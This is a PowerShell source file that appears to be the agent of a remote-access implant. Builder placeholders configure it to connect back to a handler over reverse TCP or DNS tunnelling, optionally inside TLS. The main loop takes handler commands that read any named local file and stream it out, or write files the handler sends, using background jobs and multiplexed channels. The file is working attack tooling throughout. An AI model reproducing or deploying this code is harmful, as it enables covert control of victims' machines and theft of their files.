

function Handle-Message([PSObject] $transport, [PSObject] $msg) {
    if ($msg.channelnumber -eq $MESSAGE_CHANNEL_COMMAND) {
        if ($msg.mtype -eq $MESSAGE_TYPE_COMMAND) {
            # TODO: handle command
            return $false
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_MESSAGE) {
            $text = New-Object String($msg.content, 0, $msg.leng)
            Write-Host '[+] HANDLER:' $text
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_ERRORMESSAGE) {
            $text = New-Object String($msg.content, 0, $msg.leng)
            Write-Host '[-] ERROR: HANDLER:' $text
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_DOWNLOADCOMMAND) {
            $downloadchannelid = [Int16][BitConverter]::ToInt16($msg.content, 0)
	        $downloadchannelid = [UInt16][System.Net.IPAddress]::NetworkToHostOrder([Int16]$downloadchannelid)
	        $filenamelen = ($msg.leng) - 2
            $filename = New-Object String($msg.content, 2, $filenamelen)
            $job = Command-SendFile $downloadchannelid $filename $transport
            $Runningthreads.Add($job)
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_UPLOADCOMMAND) {
            $channelid = [Int16][BitConverter]::ToInt16($msg.content, 0)
	        $channelid = [UInt16][System.Net.IPAddress]::NetworkToHostOrder([Int16]$channelid)
	        $filenamelen = ($msg.leng) - 2
            $filename = New-Object String($msg.content, 2, $filenamelen)
            $job = Command-ReceiveFile $channelid $filename $transport
            $Runningthreads.Add($job)
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_EOC) {
            Write-Host '[-] ERROR: received close message from handler, exiting...'
            Channel-setClosed $Channels[$MESSAGE_CHANNEL_COMMAND]
            return $true
        } else {
            # TODO: implement other types
            Write-Host 'ERROR: message with invalid type received:' $msg.mtype
            return $false
        }
    } else {
        if (! $Channels.ContainsKey($msg.channelnumber)) {
            Write-Host 'ERROR: message with unknown channel number received, droping: ' $msg.channelnumber
            return $false
        } elseif (Channel-isReserved $Channels[$msg.channelnumber]) {
            Channel-setOpen $Channels[$msg.channelnumber]
        } elseif (Channel-isClosed $Channels[$msg.channelnumber]) {
            $message1 = Message-Create -MType $MESSAGE_TYPE_EOC -ChannelNumber $msg.channelnumber -Content $MESSAGE_EMPTY_CONTENT
            Message-SendToTransport $message1 $transport
            return $false
        }

        if ($msg.mtype -eq $MESSAGE_TYPE_DATA) {
            Channel-WriteFromSend $Channels[$msg.channelnumber] $msg.content
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_EOC) {
            Channel-setClosed $Channels[$msg.channelnumber]
        } else {
            Write-Host 'ERROR: received invalid command for channel:' $msg.mtype $msg.channelnumber
            return $false
        }

        # TODO: implement further channels functions
        return $true
    }
}

function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSObject] $transport) {
    Write-Host '[+] sending file to handler:' $filename '(channel:' $downloadchannelid ')'

    if ($Channels.ContainsKey($downloadchannelid)) {
        Write-Host "ERROR: download channel id is already in use"
        return
    }

    $Channels.Add($downloadchannelid, (Channel-Open))
    Channel-setOpen $Channels[$downloadchannelid]


    try {
        $fs = new-object IO.FileStream($filename, [IO.FileMode]::Open)
        Write-Host "[+] file has" $fs.Length "bytes"
        # TODO: send file size to handler
        $fs.Close()
    } catch {
        Write-Host "ERROR: could not open file for reading"
        # TODO: send error to handler!
        return
    }


    $script = {
        param([string]$filename, [PSObject]$channel)
        Write-Output $filename
        Write-Output $channel

        $fs = new-object IO.FileStream($filename, [IO.FileMode]::Open)

        $buf = new-object byte[] 1024

        $reader = new-object IO.BinaryReader($fs)
        while ($true) {
            $br = $reader.Read($buf, 0, 1024)
            if ($br -eq 0) {
                break;
            }
            #Channel-Write $channel $buf $br # cannot call this function from job, hacking it
            for($i=0; $i -lt $br; ++$i) {
                $channel.sendqueue.Enqueue($buf[$i])
            }
            Write-Output "wrote" $br "bytes"
        }
        $reader.Close()
        #Channel-setClosed $channel # cannot call this function from job, hacking it
        $channel.state = "CLOSED"
        Write-Output $channel.sendqueue.Count

    }

    $p = [PowerShell]::Create()
    $null = $p.AddScript($script).AddArgument($filename).AddArgument($Channels[$downloadchannelid])
    $job = $p.BeginInvoke()
    Write-Host "DEBUG: started backgroud write process"

    #Write-Host $Channels[$downloadchannelid].sendqueue.Count
    #$done = $job.AsyncWaitHandle.WaitOne()
    #$p.EndInvoke($job)
    #Write-Host $Channels[$downloadchannelid].sendqueue.Count

    return New-Object -TypeName PSObject -Property @{
       'shell' = $p
       'job' = $job
    }
}

function Command-ReceiveFile([UInt16] $channelid, [string] $filename, [PSObject] $transport) {
    Write-Host '[+] receiving file from handler:' $filename '(channel:' $channelid ')'

    if ($Channels.ContainsKey($channelid)) {
        Write-Host "[-] ERROR: upload channel id is already in use"
        return
    }

    $Channels.Add($channelid, (Channel-Open))
    # handler has to send, we are not opening the channel on our side

    try {
        $fs = new-object IO.FileStream($filename, [IO.FileMode]::Create)
        $fs.Close()
    } catch {
        Write-Host "[-] ERROR: could not open file for writing"
        # TODO: send error to handler!
        return
    }

    $script = {
        param([string]$filename, [PSObject]$channel)

        # TODO: change logging !!!
        $Logfile = "c:\\Users\\fsteglich\\Desktop\\receivefile.log"

        Add-content $Logfile -value "DEBUG: waiting for channel to open"
        while ($channel.state -eq "RESERVED") {}
        Add-content $Logfile -value "DEBUG: channel opened"

        $fs = new-object IO.FileStream($filename, [IO.FileMode]::Create)

        $writer = new-object IO.BinaryWriter($fs)
        while ($true) {
            Add-content $Logfile -value "DEBUG: waiting for data in channel"
            while (($channel.state -eq "OPEN") -and ($channel.receivequeue.Count -eq 0)) {
                Start-Sleep -Milliseconds 100
                Add-content $Logfile -value "DEBUG: state = $($channel.state), receivequeue.Count = $($channel.receivequeue.Count)"
            }
            if (($channel.state -eq "CLOSED") -and ($channel.receivequeue.Count -eq 0)) {
                Add-content $Logfile -value "DEBUG: channel closed"
                break
            }
            Add-content $Logfile -value "DEBUG: data in channel"

            #Channel-Read $channel 1024 # cannot call this function from job, hacking it
            $readlen = 1024
            if ($channel.receivequeue.Count -lt $bytestoread) {
                $readlen = $channel.receivequeue.Count;
            }
            $bytes = New-Object byte[]($readlen);
            for ($i=0; $i -lt $readlen; ++$i) {
                $bytes[$i] = $channel.receivequeue.Dequeue();
            }

            $writer.Write($bytes, 0, $readlen)
            Add-content $Logfile -value "DEBUG: wrote $($readlen) bytes"
        }
        Add-content $Logfile -value "DEBUG: write done"
        $writer.Close()
        $fs.Close()
    }

    $p = [PowerShell]::Create()
    $null = $p.AddScript($script).AddArgument($filename).AddArgument($Channels[$channelid])
    $job = $p.BeginInvoke()
    Write-Host "DEBUG: started backgroud read process"

    #$done = $job.AsyncWaitHandle.WaitOne()
    #$p.EndInvoke($job)

    return New-Object -TypeName PSObject -Property @{
       'shell' = $p
       'job' = $job
    }

}

function ReceiveHeader-Async-Start([PSObject] $transport) {

    $script = {
        param([UInt32]$messageheaderlen, [PSObject]$transport, [PSObject]$initialtransport, [string]$connectionmethod, [string]$channelencryption)

        # This is a copy of the Transport-Tls-Receive / Transport-ReverseTcp-Receive function
        # with some special case handling for DNS
        $numb = 0
	    $buffer = New-Object byte[]($messageheaderlen)
	    while ($numb -lt $messageheaderlen) {
	        if ($connectionmethod -eq "REVERSETCP") {
		        $numb += $transport.reader.Read($buffer, $numb, $messageheaderlen-$numb)
		    } elseif ($connectionmethod -eq "DNS") {
		        while (!($initialtransport.stream.HasData())) {}
		        if ($channelencryption -eq "NONE") {
		            $numb += $transport.stream.Read($buffer, $numb, $messageheaderlen-$numb)
		        } elseif ($channelencryption -eq "TLS") {
		            $numb += $transport.reader.Read($buffer, $numb, $messageheaderlen-$numb)
		        } else {
		            # ERROR with invalid $channelencryption for DNS
		            return $NULL
		        }
		    } else {
		        # ERROR with invalid $connectionmethod
		        return $NULL
		    }
	    }

	    return $buffer
    }

    $p = [PowerShell]::Create()
    $null = $p.AddScript($script).AddArgument($MESSAGE_HEADER_LEN).AddArgument($transport).AddArgument($initialtransport).AddArgument($CONNECTIONMETHOD).AddArgument($CHANNELENCRYPTION)
    $job = $p.BeginInvoke()
    Write-Host "DEBUG: started background receive header process"

    #Write-Host $Channels[$downloadchannelid].sendqueue.Count
    #$done = $job.AsyncWaitHandle.WaitOne()
    #$p.EndInvoke($job)
    #Write-Host $Channels[$downloadchannelid].sendqueue.Count

    return New-Object -TypeName PSObject -Property @{
       'shell' = $p
       'job' = $job
    }

}

function ReceiveHeader-Async-IsDone([PSObject] $asyncobj) {

    return $asyncobj.job.IsCompleted

}

function ReceiveHeader-Async-GetResult([PSObject] $asyncobj) {

    Write-Host "DEBUG: ended background receive header process"
    $res = $asyncobj.shell.EndInvoke($asyncobj.job)
    $asyncobj.shell.Dispose()
    return $res

}


# Recycle stager variables
if ($fp) {
    $servercertfp = $fp
} else {
    $servercertfp = "SYREPLACE_SERVERCERTFINGERPRINT"
}

$CONNECTIONMETHOD = "SYREPLACE_CONNECTIONMETHOD"
$CHANNELENCRYPTION = "SYREPLACE_CHANNELENCRYPTION"
$CONNECTHOST = "SYREPLACE_CONNECTHOST"
$CONNECTPORT = "SYREPLACE_CONNECTPORT"
$DNSZONE = "SYREPLACE_DNSZONE"
$DNSSERVER = "SYREPLACE_DNSSERVER"
$TIMEOUT = "SYREPLACE_TIMEOUT"
$RETRIES = "SYREPLACE_RETRIES"

$Channels = @{ $MESSAGE_CHANNEL_COMMAND = Channel-Open }
$Runningthreads = New-Object System.Collections.Generic.List[PSObject]

if ($CONNECTIONMETHOD -eq "REVERSETCP") {
    $initialtransport = Transport-ReverseTcp-Open -LHost $CONNECTHOST -LPort $CONNECTPORT
} elseif ($CONNECTIONMETHOD -eq "DNS") {
    $initialtransport = Transport-Dns-Open -Zone $DNSZONE -DnsServer $DNSSERVER -timeout $TIMEOUT -retries $RETRIES
} else {
    Write-Output "ERROR: connection method not defined"
    Exit(1)
}

if ($CHANNELENCRYPTION -eq "NONE") {
    Write-Output "Warning: CONNECTION UNENCRYPTED"
    $transport = $initialtransport
} elseif ($CHANNELENCRYPTION -eq "TLS") {
    if ($CONNECTIONMETHOD -eq "REVERSETCP") {
        $stream = $initialtransport.tcpStream
    } elseif ($CONNECTIONMETHOD -eq "DNS") {
        $stream = $initialtransport.stream
    }
    $transport = Transport-Tls-Open $stream $servercertfp
} else {
    Write-Output "ERROR: wrapper method not defined"
    Exit(1)
}


try {

Channel-setOpen $Channels[$MESSAGE_CHANNEL_COMMAND]

# show hello message from handler
#$res = Message-ParseFromTransport $transport
#$res = Handle-Message $transport $res

#Write-Host "DEBUG: sending hello to handler"

# send hello message to handler
$text = [System.Text.Encoding]::UTF8.GetBytes("Hello from Agent")
$message1 = Message-Create -MType $MESSAGE_TYPE_MESSAGE -ChannelNumber $MESSAGE_CHANNEL_COMMAND -Content $text
Message-SendToTransport $message1 $transport

#Write-Host "DEBUG: send hello to handler"

# try to read message headers in the background
$asyncobj = ReceiveHeader-Async-Start $transport

# main loop to send and receive data
while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {

    # try to read a message from the handler
    while ( ReceiveHeader-Async-IsDone $asyncobj ) {
        # receive result of the async job
        $messageheaders = ReceiveHeader-Async-GetResult $asyncobj
        Write-Host "DEBUG: messageheaders =" $messageheaders
        if ($CONNECTIONMETHOD -eq "DNS") {
            Write-Host "DEBUG: next request-number =" $initialtransport.requestid
        }


        # receive full message object and handle it
        $msg = Message-ParseFromTransport $transport $messageheaders
        $res = Handle-Message $transport $msg
        # TODO: report error on $res -eq $false

        # and try to read the next one
        $asyncobj = ReceiveHeader-Async-Start $transport
    }

    # store list of channels that can be closed now
    $channelstoremove = @{ }

    # set this flag if we have sended at least one package
    $hassended = $false

    # send data for each channel
    foreach ($chanid in $Channels.Keys) {
        if ($chanid -eq $MESSAGE_CHANNEL_COMMAND) {
            continue  # the command channel is different still
        }
        if (Channel-HasDataToSend($Channels[$chanid])) {
            Write-Host "DEBUG: sending data"
            $data = Channel-ReadToSend $Channels[$chanid] $MESSAGE_MAX_DATA_LEN
            $msg = Message-Create -MType $MESSAGE_TYPE_DATA -ChannelNumber $chanid -Content $data
            Message-SendToTransport $msg $transport
            $hassended = $true
        } elseif (Channel-isClosed($Channels[$chanid])) {
            Write-Host "DEBUG: sending EOC"
            $msg = Message-Create -MType $MESSAGE_TYPE_EOC -ChannelNumber $chanid -Content $MESSAGE_EMPTY_CONTENT
            Message-SendToTransport $msg $transport
            $hassended = $true
            $channelstoremove.Add($chanid, $chanid)
        }
    }

    # remove closed channels from list
    foreach ($chanid in $channelstoremove.Keys) {
        $Channels.Remove($chanid)
    }

    # if we must poll, always send at least one package
    if ((!$hassended) -and ($CONNECTIONMETHOD -eq "DNS")) {
        Write-Host "DEBUG: sending a polling NODATA message to handler"
        $initialtransport.stream.Write($NULL, 0, 0);
    }

}


} finally {

# stop async refresh
Write-Host "DEBUG: stoping background message reading"
$asyncobj.shell.Dispose()

# terminate all jobs on exit
Write-Host "DEBUG: stoping background jobs"
foreach($t in $Runningthreads) {
    #if ($t.job.IsCompleted) {
    #    $t.shell.EndInvoke($t.job)
    #}
    $t.shell.Dispose()
}


if ($CHANNELENCRYPTION -eq "TLS") {
    Transport-Tls-Close $transport
}

if ($CONNECTIONMETHOD -eq "REVERSETCP") {
    Transport-ReverseTcp-Close $initialtransport
} elseif ($CONNECTIONMETHOD -eq "DNS") {
    Transport-Dns-Close $initialtransport
}

}